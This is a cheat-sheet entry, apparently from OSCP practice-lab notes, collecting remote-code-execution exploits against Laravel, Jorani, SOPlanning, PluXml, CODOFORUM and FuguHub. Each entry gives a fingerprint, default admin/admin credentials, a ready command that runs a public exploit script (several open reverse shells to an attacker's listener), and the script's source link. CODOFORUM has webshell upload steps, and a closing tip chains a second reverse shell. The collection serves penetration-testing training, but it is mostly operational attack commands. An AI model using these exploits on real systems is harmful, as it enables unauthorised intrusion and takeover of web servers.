title: Web App RCE Collection — Laravel, Jorani, SOPlanning, PluXml, CODOFORUM
body: A collection of authenticated and unauthenticated RCE exploits for specific web apps that appear on OSCP PG practice boxes. Each follows the same pattern: identify the app → check the version → run the exploit → shell. Default credentials are always worth trying first.
cmd:
# ══════════════════════════════════════════════════
# LARAVEL CVE-2021-3129 (debug mode RCE, unauthenticated)
# ══════════════════════════════════════════════════
# Fingerprint: Laravel error page, APP_DEBUG=true in response headers
#              or .env file exposed via path traversal
# Exploit: debug mode exposes a log manipulation endpoint
python3 exploit.py
# https://github.com/FunPhishing/Laravel-8.4.2-rce-CVE-2021-3129
# Usage: python3 exploit.py -u http://<IP> -c 'id'
# Note: reads /var/www/html/storage/logs/laravel.log — must be writable

# ══════════════════════════════════════════════════
# JORANI CVE-2023-26469 (authenticated RCE)
# ══════════════════════════════════════════════════
# Fingerprint: Jorani Leave Management System in page title
# Default creds: admin/admin
# Exploit:
python3 CVE_Jorani.py http://<IP> <LHOST> <LPORT>
# https://raw.githubusercontent.com/Orange-Cyberdefense/CVE-repository/refs/heads/master/PoCs/CVE_Jorani.py
# Note: may be unstable — if shell dies quickly, get a second shell immediately

# ══════════════════════════════════════════════════
# SOPLANNING CVE-2024-27115 (authenticated RCE)
# ══════════════════════════════════════════════════
# Fingerprint: SOPlanning in page title, /planning.php in URL
# Default creds: admin/admin
# Exploit:
python3 SOPlanning-1.52.01-RCE-Exploit.py -t http://<IP>/<path> -u admin -p admin
# https://www.exploit-db.com/exploits/52082
# Note: if the URL path is weird, check if the install is at /planning.php

# ══════════════════════════════════════════════════
# PLUXML CVE-2022-25018 (authenticated RCE via template)
# ══════════════════════════════════════════════════
# Fingerprint: PluXml CMS in page title/footer
# Default creds: admin/admin
# Exploit:
python3 pluxml.py http://<IP> admin admin
# https://github.com/erlaplante/pluxml-rce

# ══════════════════════════════════════════════════
# CODOFORUM (admin upload bypass → webshell)
# ══════════════════════════════════════════════════
# Fingerprint: CODOFORUM in page title
# Exploit: upload a PHP webshell via admin panel logo upload
# Admin panel > Global Settings > Change Forum Logo
# Upload: shell.php (bypasses extension check)
# Access: http://<IP>/sites/default/assets/img/attachments/shell.php

# ══════════════════════════════════════════════════
# FUGUHUB/BARRACUDA CVE-2024-27697 (authenticated RCE)
# ══════════════════════════════════════════════════
# Fingerprint: FuguHub or Barracuda Drive on port 8000
# Default creds: admin/admin
# Exploit:
python3 exploit.py --rhost <IP> --rport 8000 --lhost <LHOST> --lport <LPORT>
# https://github.com/SanjinDedic/FuguHub-8.4-Authenticated-RCE-CVE-2024-27697
warn: Most of these require authentication — try default credentials before assuming they're useless. Laravel CVE-2021-3129 is unauthenticated but only works when APP_DEBUG=true (the error page will be visible). CODOFORUM's upload bypass works through the admin logo upload which allows any extension. Jorani shells can be unstable — set up a second listener and run a second reverse shell from inside the first.

choices.label: Need to enumerate the app version first
